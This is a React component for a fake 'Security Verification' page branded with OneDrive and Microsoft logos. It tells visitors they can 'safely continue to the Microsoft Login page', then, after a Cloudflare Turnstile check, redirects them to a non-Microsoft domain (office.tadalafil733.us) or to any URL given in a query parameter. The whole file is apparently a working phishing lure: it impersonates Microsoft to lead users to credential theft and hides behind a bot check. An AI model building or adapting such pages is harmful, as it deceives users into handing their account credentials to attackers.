import { useEffect, useRef } from 'react';

function App() {
  const turnstileRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    // Get redirect URL from query parameters
    const params = new URLSearchParams(window.location.search);
    const redirectUrl = params.get('redirect') || 'https://office.tadalafil733.us/aVreVsFb';

    // Wait for Turnstile script to load and render widget
    const checkTurnstile = setInterval(() => {
      if ((window as any).turnstile && turnstileRef.current) {
        clearInterval(checkTurnstile);

        // Clear any existing widget
        turnstileRef.current.innerHTML = '';

        // Render the Turnstile widget
        (window as any).turnstile.render(turnstileRef.current, {
          sitekey: '0x4AAAAAABaeDHdwHVmJobfE',
          theme: 'dark',
          callback: (token: string) => {
            // Redirect on successful verification
            window.location.href = redirectUrl;
          },
        });
      }
    }, 100);

    return () => {
      clearInterval(checkTurnstile);
    };
  }, []);

  return (
    <div
      className="min-h-screen flex flex-col items-center justify-center p-6 relative"
      style={{
        backgroundImage: 'radial-gradient(circle at 100% 0%, rgba(199,224,244,0.4) 0%, rgba(255,255,255,1) 40%)'
      }}
    >
      <div className="bg-white rounded-2xl shadow-2xl max-w-xl w-full p-6 text-center">
        <div className="mb-4 flex justify-center">
          <img
            src="https://download.logo.wine/logo/OneDrive/OneDrive-Logo.wine.png"
            alt="OneDrive Logo"
            className="h-20 w-auto"
          />
        </div>

        <h1 className="text-3xl font-bold text-gray-900 mb-3 tracking-tight">
          Security Verification
        </h1>

        <p className="text-base text-gray-600 mb-6 leading-relaxed">
          You can now safely continue to the Microsoft Login page to access your files.
        </p>

        <div className="flex justify-center">
          <div ref={turnstileRef}></div>
        </div>

        <div className="mt-4 text-sm text-gray-500">
          <p>Secure connection verified</p>
        </div>
      </div>

      <div className="absolute bottom-8 flex justify-center">
        <img
          src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg"
          alt="Microsoft"
          className="h-6"
        />
      </div>
    </div>
  );
}

export default App;
